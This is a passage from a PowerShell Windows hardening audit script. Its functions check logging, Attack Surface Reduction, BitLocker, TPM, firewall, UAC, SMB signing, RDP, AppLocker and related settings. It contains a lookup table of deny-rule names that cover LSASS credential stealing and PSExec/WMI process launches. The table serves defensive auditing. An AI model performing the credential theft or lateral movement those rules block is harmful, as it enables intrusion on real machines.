    Checks if PowerShell security logging features are enabled:
    - Script Block Logging: Records all script blocks executed
    - Module Logging: Logs specific module activities
    - Transcription: Records all PowerShell sessions
    
    EXPECTED RESULT: Logging features enabled
    FAILED TEST: Logging disabled or not configured
#>
function pslogging() {
    Write-Host -ForegroundColor White -BackgroundColor Blue "`n--- 41. PowerShell Logging Configuration ---"
    
    # Check Script Block Logging
    $scriptBlockLogging = Get-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging" -ErrorAction SilentlyContinue
    if ($scriptBlockLogging.EnableScriptBlockLogging -eq 1) {
        Write-Host -ForegroundColor $processmessagecolor "Script Block Logging: ENABLED"
    }
    else {
        Write-Host -ForegroundColor $warningmessagecolor "Script Block Logging: DISABLED"
    }
    
    # Check Module Logging
    $moduleLogging = Get-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging" -ErrorAction SilentlyContinue
    if ($moduleLogging.EnableModuleLogging -eq 1) {
        Write-Host -ForegroundColor $processmessagecolor "Module Logging: ENABLED"
    }
    else {
        Write-Host -ForegroundColor $warningmessagecolor "Module Logging: DISABLED"
    }
    
    # Check Transcription
    $transcription = Get-ItemProperty -Path "HKLM:\Software\Policies\Microsoft\Windows\PowerShell\Transcription" -ErrorAction SilentlyContinue
    if ($transcription.EnableTranscripting -eq 1) {
        Write-Host -ForegroundColor $processmessagecolor "Transcription: ENABLED"
        if ($transcription.OutputDirectory) {
            Write-Host -ForegroundColor $processmessagecolor "  Output Directory: $($transcription.OutputDirectory)"
        }
    }
    else {
        Write-Host -ForegroundColor $warningmessagecolor "Transcription: DISABLED"
    }
    
    Write-Host -ForegroundColor $processmessagecolor "`nRecommendation: Enable all PowerShell logging for security monitoring"
}

<#
.SYNOPSIS
    Test 42: Attack Surface Reduction (ASR) Rules status check
    
.DESCRIPTION
    Enumerates which ASR rules are configured and their enforcement mode:
    - Enabled (block mode)
    - Audit (monitoring only)
    - Disabled/Not configured
    
    EXPECTED RESULT: ASR rules enabled in block mode
    FAILED TEST: No ASR rules configured
#>
function asrrules() {
    Write-Host -ForegroundColor White -BackgroundColor Blue "`n--- 42. Attack Surface Reduction Rules Status ---"
    
    try {
        $preferences = Get-MpPreference
        $asrRules = $preferences.AttackSurfaceReductionRules_Ids
        $asrActions = $preferences.AttackSurfaceReductionRules_Actions
        
        if ($asrRules -and $asrRules.Count -gt 0) {
            Write-Host -ForegroundColor $processmessagecolor "ASR Rules Configured: $($asrRules.Count)"
            Write-Host ""
            
            $asrRuleNames = @{
                "BE9BA2D9-53EA-4CDC-84E5-9B1EEEE46550" = "Block executable content from email client and webmail"
                "D4F940AB-401B-4EFC-AADC-AD5F3C50688A" = "Block Office applications from creating child processes"
                "3B576869-A4EC-4529-8536-B80A7769E899" = "Block Office applications from creating executable content"
                "75668C1F-73B5-4CF0-BB93-3ECF5CB7CC84" = "Block Office applications from injecting code into other processes"
                "D3E037E1-3EB8-44C8-A917-57927947596D" = "Block JavaScript or VBScript from launching downloaded executable content"
                "5BEB7EFE-FD9A-4556-801D-275E5FFC04CC" = "Block execution of potentially obfuscated scripts"
                "92E97FA1-2EDF-4476-BDD6-9DD0B4DDDC7B" = "Block Win32 API calls from Office macros"
                "01443614-cd74-433a-b99e-2ecdc07bfc25" = "Block executable files from running unless they meet prevalence, age, or trusted list criterion"
                "c1db55ab-c21a-4637-bb3f-a12568109d35" = "Use advanced protection against ransomware"
                "9e6c4e1f-7d60-472f-ba1a-a39ef669e4b2" = "Block credential stealing from LSASS"
                "d1e49aac-8f56-4280-b9ba-993a6d77406c" = "Block process creations originating from PSExec and WMI commands"
                "b2b3f03d-6a65-4f7b-a9c7-1c7ef74a9ba4" = "Block untrusted and unsigned processes that run from USB"
                "26190899-1602-49e8-8b27-eb1d0a1ce869" = "Block Office communication apps from creating child processes"
                "7674ba52-37eb-4a4f-a9a1-f0f9a1619a2c" = "Block Adobe Reader from creating child processes"
                "e6db77e5-3df2-4cf1-b95a-636979351e5b" = "Block persistence through WMI event subscription"
            }
            
            for ($i = 0; $i -lt $asrRules.Count; $i++) {
                $ruleName = $asrRuleNames[$asrRules[$i]]
                if (-not $ruleName) { $ruleName = $asrRules[$i] }
                
                $action = switch ($asrActions[$i]) {
                    0 { "Disabled" }
                    1 { "Block" }
                    2 { "Audit" }
                    6 { "Warn" }
                    default { "Unknown ($($asrActions[$i]))" }
                }
                
                $color = if ($asrActions[$i] -eq 1) { $processmessagecolor } elseif ($asrActions[$i] -eq 2) { $warningmessagecolor } else { $errormessagecolor }
                Write-Host -ForegroundColor $color "  [$action] $ruleName"
            }
            Write-Host -ForegroundColor $processmessagecolor "`nTest SUCCEEDED - ASR rules are configured"
        }
        else {
            Write-Host -ForegroundColor $errormessagecolor "No ASR rules configured - test FAILED"
            Write-Host -ForegroundColor $warningmessagecolor "Recommendation: Configure ASR rules via Intune or Group Policy"
        }
    }
    catch {
        Write-Host -ForegroundColor $errormessagecolor "Error checking ASR rules: $_"
    }
}

<#
.SYNOPSIS
    Test 43: Controlled Folder Access (ransomware protection) status
    
.DESCRIPTION
    Verifies if Controlled Folder Access is enabled, which protects important folders
    from unauthorized changes by ransomware and other malicious software.
    
    EXPECTED RESULT: Controlled Folder Access enabled
    FAILED TEST: Feature disabled
#>
function controlledfolderaccess() {
    Write-Host -ForegroundColor White -BackgroundColor Blue "`n--- 43. Controlled Folder Access (Ransomware Protection) ---"
    
    try {
        $preferences = Get-MpPreference
        $cfaStatus = $preferences.EnableControlledFolderAccess
        
        switch ($cfaStatus) {
            0 { 
                Write-Host -ForegroundColor $errormessagecolor "Controlled Folder Access: DISABLED - test FAILED"
                Write-Host -ForegroundColor $warningmessagecolor "Recommendation: Enable Controlled Folder Access for ransomware protection"
            }
            1 { 
                Write-Host -ForegroundColor $processmessagecolor "Controlled Folder Access: ENABLED (Block mode) - test SUCCEEDED"
                $protectedFolders = $preferences.ControlledFolderAccessProtectedFolders
                if ($protectedFolders) {
                    Write-Host -ForegroundColor $processmessagecolor "Protected Folders: $($protectedFolders.Count)"
                }
            }
            2 { 
                Write-Host -ForegroundColor $warningmessagecolor "Controlled Folder Access: AUDIT MODE"
                Write-Host -ForegroundColor $warningmessagecolor "Recommendation: Change to Block mode for active protection"
            }
            default {
                Write-Host -ForegroundColor $processmessagecolor "Controlled Folder Access status: $cfaStatus"
            }
        }
    }
    catch {
        Write-Host -ForegroundColor $errormessagecolor "Error checking Controlled Folder Access: $_"
    }
}

<#
.SYNOPSIS
    Test 44: Credential Guard status verification
    
.DESCRIPTION
    Checks if Credential Guard is running, which uses virtualization-based security
    to isolate credentials and protect against credential theft attacks.
    
    EXPECTED RESULT: Credential Guard running
    FAILED TEST: Not configured or not running
#>
function credentialguard() {
    Write-Host -ForegroundColor White -BackgroundColor Blue "`n--- 44. Credential Guard Status ---"
    
    try {
        $deviceGuard = Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard -ErrorAction SilentlyContinue
        
        if ($deviceGuard) {
            $credGuardStatus = $deviceGuard.SecurityServicesRunning
            
            if ($credGuardStatus -contains 1) {
                Write-Host -ForegroundColor $processmessagecolor "Credential Guard: RUNNING - test SUCCEEDED"
            }
            else {
                Write-Host -ForegroundColor $warningmessagecolor "Credential Guard: NOT RUNNING - test FAILED"
            }
            
            $credGuardConfigured = $deviceGuard.SecurityServicesConfigured
            if ($credGuardConfigured -contains 1) {
                Write-Host -ForegroundColor $processmessagecolor "Credential Guard: Configured"
            }
            else {
                Write-Host -ForegroundColor $warningmessagecolor "Credential Guard: Not configured"
                Write-Host -ForegroundColor $warningmessagecolor "Recommendation: Enable Credential Guard via Group Policy or Intune"
            }
        }
        else {
            Write-Host -ForegroundColor $warningmessagecolor "Unable to query Credential Guard status (may require newer Windows version)"
        }
    }
    catch {
        Write-Host -ForegroundColor $errormessagecolor "Error checking Credential Guard: $_"
    }
}

<#
.SYNOPSIS
    Test 45: Secure Boot status verification
    
.DESCRIPTION
    Verifies that UEFI Secure Boot is enabled, which prevents unauthorized
    operating systems and bootloaders from loading during startup.
    
    EXPECTED RESULT: Secure Boot enabled
    FAILED TEST: Secure Boot disabled or not supported
#>
function secureboot() {
    Write-Host -ForegroundColor White -BackgroundColor Blue "`n--- 45. Secure Boot Status ---"
    
    try {
        $secureBootEnabled = Confirm-SecureBootUEFI
        
        if ($secureBootEnabled) {
            Write-Host -ForegroundColor $processmessagecolor "Secure Boot: ENABLED - test SUCCEEDED"
        }
        else {
            Write-Host -ForegroundColor $errormessagecolor "Secure Boot: DISABLED - test FAILED"
            Write-Host -ForegroundColor $warningmessagecolor "Recommendation: Enable Secure Boot in UEFI/BIOS settings"
        }
    }
    catch {
        Write-Host -ForegroundColor $warningmessagecolor "Secure Boot: NOT SUPPORTED or unable to verify (Legacy BIOS mode?)"
        Write-Host -ForegroundColor $warningmessagecolor "Error: $_"
    }
}

<#
.SYNOPSIS
    Test 46: BitLocker encryption status check
    
.DESCRIPTION
    Verifies that BitLocker drive encryption is enabled on the OS drive,
    protecting data at rest from unauthorized access.
    
    EXPECTED RESULT: BitLocker fully encrypted
    FAILED TEST: Not encrypted or encryption in progress
#>
function bitlocker() {
    Write-Host -ForegroundColor White -BackgroundColor Blue "`n--- 46. BitLocker Encryption Status ---"
    
    try {
        $bitlockerVolume = Get-BitLockerVolume -MountPoint $env:SystemDrive -ErrorAction Stop
        
        Write-Host -ForegroundColor $processmessagecolor "Volume: $($bitlockerVolume.MountPoint)"
        Write-Host -ForegroundColor $processmessagecolor "Protection Status: $($bitlockerVolume.ProtectionStatus)"
        Write-Host -ForegroundColor $processmessagecolor "Encryption Percentage: $($bitlockerVolume.EncryptionPercentage)%"
        Write-Host -ForegroundColor $processmessagecolor "Volume Status: $($bitlockerVolume.VolumeStatus)"
        
        if ($bitlockerVolume.ProtectionStatus -eq "On" -and $bitlockerVolume.EncryptionPercentage -eq 100) {
            Write-Host -ForegroundColor $processmessagecolor "BitLocker: FULLY ENCRYPTED AND PROTECTED - test SUCCEEDED"
        }
        elseif ($bitlockerVolume.ProtectionStatus -eq "On") {
            Write-Host -ForegroundColor $warningmessagecolor "BitLocker: Encryption in progress"
        }
        else {
            Write-Host -ForegroundColor $errormessagecolor "BitLocker: NOT PROTECTED - test FAILED"
            Write-Host -ForegroundColor $warningmessagecolor "Recommendation: Enable BitLocker encryption"
        }
    }
    catch {
        Write-Host -ForegroundColor $errormessagecolor "BitLocker: NOT ENABLED or unable to query - test FAILED"
        Write-Host -ForegroundColor $warningmessagecolor "Error: $_"
        Write-Host -ForegroundColor $warningmessagecolor "Recommendation: Enable BitLocker encryption on system drive"
    }
}

<#
.SYNOPSIS
    Test 47: TPM (Trusted Platform Module) status verification
    
.DESCRIPTION
    Checks if TPM is present, enabled, and activated. TPM is required for
    many security features including BitLocker, Windows Hello, and Credential Guard.
    
    EXPECTED RESULT: TPM present, enabled, and activated
    FAILED TEST: TPM not present or not enabled
#>
function tpmstatus() {
    Write-Host -ForegroundColor White -BackgroundColor Blue "`n--- 47. TPM (Trusted Platform Module) Status ---"
    
    try {
        $tpm = Get-Tpm
        
        Write-Host -ForegroundColor $processmessagecolor "TPM Present: $($tpm.TpmPresent)"
        Write-Host -ForegroundColor $processmessagecolor "TPM Ready: $($tpm.TpmReady)"
        Write-Host -ForegroundColor $processmessagecolor "TPM Enabled: $($tpm.TpmEnabled)"
        Write-Host -ForegroundColor $processmessagecolor "TPM Activated: $($tpm.TpmActivated)"
        
        if ($tpm.TpmPresent -and $tpm.TpmReady -and $tpm.TpmEnabled -and $tpm.TpmActivated) {
            Write-Host -ForegroundColor $processmessagecolor "TPM: FULLY OPERATIONAL - test SUCCEEDED"
            
            # Try to get TPM version
            $tpmVersion = Get-WmiObject -Namespace "root\cimv2\Security\MicrosoftTpm" -Class Win32_Tpm -ErrorAction SilentlyContinue
            if ($tpmVersion) {
                $specVersion = $tpmVersion.SpecVersion
                Write-Host -ForegroundColor $processmessagecolor "TPM Specification Version: $specVersion"
            }
        }
        else {
            Write-Host -ForegroundColor $errormessagecolor "TPM: NOT FULLY OPERATIONAL - test FAILED"
            Write-Host -ForegroundColor $warningmessagecolor "Recommendation: Enable TPM in UEFI/BIOS settings"
        }
    }
    catch {
        Write-Host -ForegroundColor $errormessagecolor "Error checking TPM status: $_"
    }
}

<#
.SYNOPSIS
    Test 48: Windows Firewall status verification
    
.DESCRIPTION
    Checks that Windows Defender Firewall is enabled for all network profiles
    (Domain, Private, Public) to protect against network-based attacks.
    
    EXPECTED RESULT: Firewall enabled on all profiles
    FAILED TEST: Firewall disabled on any profile
#>
function firewallstatus() {
    Write-Host -ForegroundColor White -BackgroundColor Blue "`n--- 48. Windows Firewall Status ---"
    
    try {
        $profiles = Get-NetFirewallProfile
        $allEnabled = $true
        
        foreach ($profile in $profiles) {
            $status = if ($profile.Enabled) { "ENABLED" } else { "DISABLED"; $allEnabled = $false }
            $color = if ($profile.Enabled) { $processmessagecolor } else { $errormessagecolor }
            
            Write-Host -ForegroundColor $color "$($profile.Name) Profile: $status"
            Write-Host -ForegroundColor $processmessagecolor "  Default Inbound Action: $($profile.DefaultInboundAction)"
            Write-Host -ForegroundColor $processmessagecolor "  Default Outbound Action: $($profile.DefaultOutboundAction)"
        }
        
        if ($allEnabled) {
            Write-Host -ForegroundColor $processmessagecolor "`nWindows Firewall: ENABLED on all profiles - test SUCCEEDED"
        }
        else {
            Write-Host -ForegroundColor $errormessagecolor "`nWindows Firewall: DISABLED on one or more profiles - test FAILED"
            Write-Host -ForegroundColor $warningmessagecolor "Recommendation: Enable Windows Firewall on all network profiles"
        }
    }
    catch {
        Write-Host -ForegroundColor $errormessagecolor "Error checking firewall status: $_"
    }
}

<#
.SYNOPSIS
    Test 49: User Account Control (UAC) configuration check
    
.DESCRIPTION
    Verifies that UAC is enabled and configured properly to prevent
    unauthorized elevation of privileges.
    
    EXPECTED RESULT: UAC enabled
    FAILED TEST: UAC disabled
#>
function uacstatus() {
    Write-Host -ForegroundColor White -BackgroundColor Blue "`n--- 49. User Account Control (UAC) Level ---"
    
    try {
        $uacEnabled = (Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name EnableLUA).EnableLUA
        $consentPromptBehaviorAdmin = (Get-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" -Name ConsentPromptBehaviorAdmin).ConsentPromptBehaviorAdmin
        
        if ($uacEnabled -eq 1) {
            Write-Host -ForegroundColor $processmessagecolor "UAC: ENABLED - test SUCCEEDED"
            
            $uacLevel = switch ($consentPromptBehaviorAdmin) {
                0 { "Never notify" }
                1 { "Prompt for credentials on the secure desktop" }
                2 { "Prompt for consent on the secure desktop" }
                3 { "Prompt for credentials" }
                4 { "Prompt for consent" }
                5 { "Prompt for consent for non-Windows binaries" }
                default { "Unknown ($consentPromptBehaviorAdmin)" }
            }
            
            Write-Host -ForegroundColor $processmessagecolor "UAC Level: $uacLevel"
            
            if ($consentPromptBehaviorAdmin -eq 0) {
                Write-Host -ForegroundColor $warningmessagecolor "Warning: UAC is enabled but set to 'Never notify' (weakest setting)"
            }
        }
        else {
            Write-Host -ForegroundColor $errormessagecolor "UAC: DISABLED - test FAILED"
            Write-Host -ForegroundColor $warningmessagecolor "Recommendation: Enable User Account Control"
        }
    }
    catch {
        Write-Host -ForegroundColor $errormessagecolor "Error checking UAC status: $_"
    }
}

<#
.SYNOPSIS
    Test 50: SMB signing configuration verification
    
.DESCRIPTION
    Checks if SMB signing is required, which prevents man-in-the-middle
    and relay attacks against SMB connections.
    
    EXPECTED RESULT: SMB signing required
    FAILED TEST: SMB signing not required
#>
function smbsigning() {
    Write-Host -ForegroundColor White -BackgroundColor Blue "`n--- 50. SMB Signing Configuration ---"
    
    try {
        $smbServerConfig = Get-SmbServerConfiguration
        
        Write-Host -ForegroundColor $processmessagecolor "Require Security Signature: $($smbServerConfig.RequireSecuritySignature)"
        Write-Host -ForegroundColor $processmessagecolor "Enable Security Signature: $($smbServerConfig.EnableSecuritySignature)"
        
        if ($smbServerConfig.RequireSecuritySignature) {
            Write-Host -ForegroundColor $processmessagecolor "SMB Signing: REQUIRED - test SUCCEEDED"
        }
        elseif ($smbServerConfig.EnableSecuritySignature) {
            Write-Host -ForegroundColor $warningmessagecolor "SMB Signing: ENABLED but not required - test partially succeeded"
            Write-Host -ForegroundColor $warningmessagecolor "Recommendation: Set SMB signing to 'Required' for maximum security"
        }
        else {
            Write-Host -ForegroundColor $errormessagecolor "SMB Signing: DISABLED - test FAILED"
            Write-Host -ForegroundColor $warningmessagecolor "Recommendation: Enable and require SMB signing"
        }
        
        # Check SMB Client configuration
        $smbClientConfig = Get-SmbClientConfiguration
        Write-Host -ForegroundColor $processmessagecolor "`nSMB Client - Require Security Signature: $($smbClientConfig.RequireSecuritySignature)"
    }
    catch {
        Write-Host -ForegroundColor $errormessagecolor "Error checking SMB signing configuration: $_"
    }
}

<#
.SYNOPSIS
    Test 51: Local administrator accounts enumeration
    
.DESCRIPTION
    Lists all local administrator accounts to identify unauthorized or
    default accounts that could pose a security risk.
    
    EXPECTED RESULT: Only authorized admin accounts present
    FAILED TEST: Unexpected or default accounts found
#>
function localadmins() {
    Write-Host -ForegroundColor White -BackgroundColor Blue "`n--- 51. Local Administrator Accounts ---"
    
    try {
        $adminGroup = Get-LocalGroup -Name "Administrators" -ErrorAction Stop
        $admins = Get-LocalGroupMember -Group $adminGroup
        
        Write-Host -ForegroundColor $processmessagecolor "Local Administrators ($($admins.Count)):"
        
        foreach ($admin in $admins) {
            Write-Host -ForegroundColor $processmessagecolor "  - $($admin.Name) ($($admin.ObjectClass))"
        }
        
        Write-Host -ForegroundColor $warningmessagecolor "`nRecommendation: Review this list and remove any unauthorized administrator accounts"
        
        # Check if built-in Administrator account is enabled
        $builtinAdmin = Get-LocalUser | Where-Object { $_.SID -like "*-500" }
        if ($builtinAdmin) {
            if ($builtinAdmin.Enabled) {
                Write-Host -ForegroundColor $warningmessagecolor "`nWarning: Built-in Administrator account is ENABLED"
                Write-Host -ForegroundColor $warningmessagecolor "Recommendation: Disable built-in Administrator account when not needed"
            }
            else {
                Write-Host -ForegroundColor $processmessagecolor "`nBuilt-in Administrator account: DISABLED"
            }
        }
    }
    catch {
        Write-Host -ForegroundColor $errormessagecolor "Error enumerating local administrators: $_"
    }
}

<#
.SYNOPSIS
    Test 52: RDP security configuration verification
    
.DESCRIPTION
    Checks RDP security settings including Network Level Authentication (NLA)
    and encryption levels to ensure secure remote access.
    
    EXPECTED RESULT: NLA enabled, strong encryption
    FAILED TEST: NLA disabled or weak encryption
#>
function rdpsecurity() {
    Write-Host -ForegroundColor White -BackgroundColor Blue "`n--- 52. RDP Security Configuration ---"
    
    try {
        $tsSettings = Get-CimInstance -Namespace "root\cimv2\TerminalServices" -ClassName Win32_TSGeneralSetting -ErrorAction Stop
        
        foreach ($setting in $tsSettings) {
            $nlaEnabled = $setting.UserAuthenticationRequired
            $encryptionLevel = $setting.MinEncryptionLevel
            
            if ($nlaEnabled -eq 1) {
                Write-Host -ForegroundColor $processmessagecolor "Network Level Authentication (NLA): ENABLED - test SUCCEEDED"
            }
            else {
                Write-Host -ForegroundColor $errormessagecolor "Network Level Authentication (NLA): DISABLED - test FAILED"
                Write-Host -ForegroundColor $warningmessagecolor "Recommendation: Enable NLA to require authentication before session establishment"
            }
            
            $encLevel = switch ($encryptionLevel) {
                1 { "Low" }
                2 { "Client Compatible" }
                3 { "High" }
                4 { "FIPS Compliant" }
                default { "Unknown ($encryptionLevel)" }
            }
            
            Write-Host -ForegroundColor $processmessagecolor "Minimum Encryption Level: $encLevel"
            
            if ($encryptionLevel -ge 3) {
                Write-Host -ForegroundColor $processmessagecolor "Encryption level is adequate"
            }
            else {
                Write-Host -ForegroundColor $warningmessagecolor "Warning: Consider increasing encryption level to High or FIPS Compliant"
            }
        }
        
        # Check if RDP is enabled
        $rdpEnabled = (Get-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name fDenyTSConnections).fDenyTSConnections
        if ($rdpEnabled -eq 0) {
            Write-Host -ForegroundColor $processmessagecolor "`nRDP: ENABLED on this system"
        }
        else {
            Write-Host -ForegroundColor $processmessagecolor "`nRDP: DISABLED on this system"
        }
    }
    catch {
        Write-Host -ForegroundColor $warningmessagecolor "Unable to query RDP settings: $_"
    }
}

<#
.SYNOPSIS
    Test 53: Windows Defender Application Guard availability check
    
.DESCRIPTION
    Verifies if Windows Defender Application Guard (WDAG) is installed,
    which provides hardware-based isolation for Microsoft Edge browsing.
    
    EXPECTED RESULT: WDAG installed
    FAILED TEST: WDAG not installed
#>
function applicationguard() {
    Write-Host -ForegroundColor White -BackgroundColor Blue "`n--- 53. Windows Defender Application Guard Status ---"
    
    try {
        $wdag = Get-WindowsOptionalFeature -Online -FeatureName "Windows-Defender-ApplicationGuard" -ErrorAction Stop
        
        if ($wdag.State -eq "Enabled") {
            Write-Host -ForegroundColor $processmessagecolor "Windows Defender Application Guard: ENABLED - test SUCCEEDED"
        }
        elseif ($wdag.State -eq "Disabled") {
            Write-Host -ForegroundColor $warningmessagecolor "Windows Defender Application Guard: DISABLED"
            Write-Host -ForegroundColor $warningmessagecolor "Recommendation: Enable WDAG for hardware-isolated browsing protection"
        }
        else {
            Write-Host -ForegroundColor $warningmessagecolor "Windows Defender Application Guard: $($wdag.State)"
        }
    }
    catch {
        Write-Host -ForegroundColor $warningmessagecolor "Windows Defender Application Guard: NOT AVAILABLE on this edition"
        Write-Host -ForegroundColor $warningmessagecolor "(Requires Windows 10/11 Enterprise or Pro with hardware virtualization)"
    }
}

<#
.SYNOPSIS
    Test 54: Virtualization-Based Security (VBS) status check
    
.DESCRIPTION
    Verifies if VBS is enabled and checks HVCI/Memory Integrity status.
    VBS uses hardware virtualization to create isolated regions for security functions.
    
    EXPECTED RESULT: VBS enabled with HVCI running
    FAILED TEST: VBS not enabled
#>
function vbssecurity() {
    Write-Host -ForegroundColor White -BackgroundColor Blue "`n--- 54. Virtualization-Based Security (VBS) ---"
    
    try {
        $deviceGuard = Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard -ErrorAction SilentlyContinue
        
        if ($deviceGuard) {
            $vbsStatus = $deviceGuard.VirtualizationBasedSecurityStatus
            
            switch ($vbsStatus) {
                0 { Write-Host -ForegroundColor $errormessagecolor "VBS: NOT ENABLED - test FAILED" }
                1 { Write-Host -ForegroundColor $processmessagecolor "VBS: ENABLED - test SUCCEEDED" }
                2 { Write-Host -ForegroundColor $processmessagecolor "VBS: ENABLED AND RUNNING - test SUCCEEDED" }
                default { Write-Host -ForegroundColor $processmessagecolor "VBS Status: $vbsStatus" }
            }
            
            # Check HVCI (Memory Integrity)
            $hvciStatus = $deviceGuard.SecurityServicesRunning
            if ($hvciStatus -contains 2) {
                Write-Host -ForegroundColor $processmessagecolor "HVCI (Memory Integrity): RUNNING"
            }
            else {
                Write-Host -ForegroundColor $warningmessagecolor "HVCI (Memory Integrity): NOT RUNNING"
            }
            
            $hvciConfigured = $deviceGuard.SecurityServicesConfigured
            if ($hvciConfigured -contains 2) {
                Write-Host -ForegroundColor $processmessagecolor "HVCI (Memory Integrity): CONFIGURED"
            }
            else {
                Write-Host -ForegroundColor $warningmessagecolor "HVCI (Memory Integrity): NOT CONFIGURED"
                Write-Host -ForegroundColor $warningmessagecolor "Recommendation: Enable Memory Integrity in Windows Security settings"
            }
        }
        else {
            Write-Host -ForegroundColor $warningmessagecolor "Unable to query VBS status (may require newer Windows version or hardware support)"
        }
    }
    catch {
        Write-Host -ForegroundColor $errormessagecolor "Error checking VBS status: $_"
    }
}

<#
.SYNOPSIS
    Test 55: Windows Update compliance check
    
.DESCRIPTION
    Checks for recently installed updates and identifies if security updates are current.
    Shows the last 5 installed updates and their installation dates.
    
    EXPECTED RESULT: Recent updates installed
    FAILED TEST: No recent updates or many pending updates
#>
function windowsupdate() {
    Write-Host -ForegroundColor White -BackgroundColor Blue "`n--- 55. Windows Update Compliance ---"
    
    try {
        $recentUpdates = Get-HotFix | Sort-Object InstalledOn -Descending | Select-Object -First 5
        
        if ($recentUpdates) {
            Write-Host -ForegroundColor $processmessagecolor "Recent Updates (Last 5):"
            foreach ($update in $recentUpdates) {
                $installedDate = if ($update.InstalledOn) { $update.InstalledOn.ToString("yyyy-MM-dd") } else { "Unknown" }
                Write-Host -ForegroundColor $processmessagecolor "  $($update.HotFixID) - Installed: $installedDate - $($update.Description)"
            }
            
            $latestUpdate = $recentUpdates[0]
            if ($latestUpdate.InstalledOn) {
                $daysSinceLastUpdate = (Get-Date) - $latestUpdate.InstalledOn
                Write-Host -ForegroundColor $processmessagecolor "`nLast update was $([math]::Round($daysSinceLastUpdate.TotalDays)) days ago"
                
                if ($daysSinceLastUpdate.TotalDays -gt 60) {
                    Write-Host -ForegroundColor $warningmessagecolor "Warning: Last update was more than 60 days ago"
                    Write-Host -ForegroundColor $warningmessagecolor "Recommendation: Check for and install pending Windows updates"
                }
                else {
                    Write-Host -ForegroundColor $processmessagecolor "System appears to have recent updates - test SUCCEEDED"
                }
            }
        }
        else {
            Write-Host -ForegroundColor $warningmessagecolor "No update information available"
        }
        
        # Check Windows Update service status
        $wuService = Get-Service -Name "wuauserv" -ErrorAction SilentlyContinue
        if ($wuService) {
            Write-Host -ForegroundColor $processmessagecolor "`nWindows Update Service: $($wuService.Status)"
        }
    }
    catch {
        Write-Host -ForegroundColor $errormessagecolor "Error checking Windows Update status: $_"
    }
}

<#
.SYNOPSIS
    Test 56: AppLocker policies verification
    
.DESCRIPTION
    Checks if AppLocker application control policies are configured,
    which restricts which applications can run on the system.
    
    EXPECTED RESULT: AppLocker policies configured
    FAILED TEST: No AppLocker policies found
#>
function applockerpolicies() {
    Write-Host -ForegroundColor White -BackgroundColor Blue "`n--- 56. AppLocker/Application Control Policies ---"
    
    try {
        $appLockerPolicy = Get-AppLockerPolicy -Effective -ErrorAction Stop
        
        if ($appLockerPolicy) {
            $ruleCollections = $appLockerPolicy.RuleCollections
            
            if ($ruleCollections -and $ruleCollections.Count -gt 0) {
                Write-Host -ForegroundColor $processmessagecolor "AppLocker: CONFIGURED - test SUCCEEDED"
                Write-Host -ForegroundColor $processmessagecolor "Rule Collections:"
                
                foreach ($collection in $ruleCollections) {
                    $ruleCount = if ($collection) { $collection.Count } else { 0 }
                    Write-Host -ForegroundColor $processmessagecolor "  $($collection.RuleCollectionType): $ruleCount rules"
                }
            }
            else {
                Write-Host -ForegroundColor $warningmessagecolor "AppLocker: NO POLICIES CONFIGURED - test FAILED"
                Write-Host -ForegroundColor $warningmessagecolor "Recommendation: Configure AppLocker policies for application control"
            }
        }
        else {
            Write-Host -ForegroundColor $warningmessagecolor "AppLocker: NO POLICIES CONFIGURED - test FAILED"
        }
        
        # Check AppLocker service
        $appIdService = Get-Service -Name "AppIDSvc" -ErrorAction SilentlyContinue
        if ($appIdService) {
            Write-Host -ForegroundColor $processmessagecolor "`nAppLocker Service (AppIDSvc): $($appIdService.Status)"
            if ($appIdService.Status -ne "Running" -and $ruleCollections.Count -gt 0) {
                Write-Host -ForegroundColor $warningmessagecolor "Warning: AppLocker policies exist but service is not running"
            }
        }
    }
    catch {
        Write-Host -ForegroundColor $warningmessagecolor "AppLocker: Not configured or unable to query"
        Write-Host -ForegroundColor $warningmessagecolor "Note: AppLocker is only available on Enterprise/Education editions"
    }
}

<#
.SYNOPSIS
    Test 57: Windows Sandbox availability check
    
.DESCRIPTION
    Verifies if Windows Sandbox feature is enabled, which provides
    a lightweight isolated desktop environment for running untrusted software.
    
    EXPECTED RESULT: Windows Sandbox enabled
    FAILED TEST: Feature not available or disabled
#>
function windowssandbox() {
    Write-Host -ForegroundColor White -BackgroundColor Blue "`n--- 57. Windows Sandbox Availability ---"
    
    try {
        $sandbox = Get-WindowsOptionalFeature -Online -FeatureName "Containers-DisposableClientVM" -ErrorAction Stop
        
        if ($sandbox.State -eq "Enabled") {
            Write-Host -ForegroundColor $processmessagecolor "Windows Sandbox: ENABLED - test SUCCEEDED"
        }
        elseif ($sandbox.State -eq "Disabled") {
            Write-Host -ForegroundColor $warningmessagecolor "Windows Sandbox: DISABLED"
            Write-Host -ForegroundColor $warningmessagecolor "Recommendation: Enable Windows Sandbox for testing untrusted software"
        }
        else {
            Write-Host -ForegroundColor $warningmessagecolor "Windows Sandbox: $($sandbox.State)"
        }
    }
    catch {
        Write-Host -ForegroundColor $warningmessagecolor "Windows Sandbox: NOT AVAILABLE on this edition"
        Write-Host -ForegroundColor $warningmessagecolor "(Requires Windows 10/11 Pro/Enterprise with virtualization enabled)"
    }
}

<#
.SYNOPSIS
    Test 58: DNS over HTTPS (DoH) configuration check
    
.DESCRIPTION
    Checks if DNS over HTTPS is configured to encrypt DNS queries,
    protecting against DNS spoofing and eavesdropping.
    
    EXPECTED RESULT: DoH configured
    FAILED TEST: No DoH servers configured
#>
function dnsovertthps() {
    Write-Host -ForegroundColor White -BackgroundColor Blue "`n--- 58. DNS over HTTPS (DoH) Configuration ---"
    
    try {
        $dohServers = Get-DnsClientDohServerAddress -ErrorAction Stop
        
        if ($dohServers -and $dohServers.Count -gt 0) {
            Write-Host -ForegroundColor $processmessagecolor "DNS over HTTPS: CONFIGURED - test SUCCEEDED"
            Write-Host -ForegroundColor $processmessagecolor "DoH Servers ($($dohServers.Count)):"
            
            foreach ($server in $dohServers) {
                Write-Host -ForegroundColor $processmessagecolor "  Server: $($server.ServerAddress)"
                Write-Host -ForegroundColor $processmessagecolor "  Template: $($server.DohTemplate)"
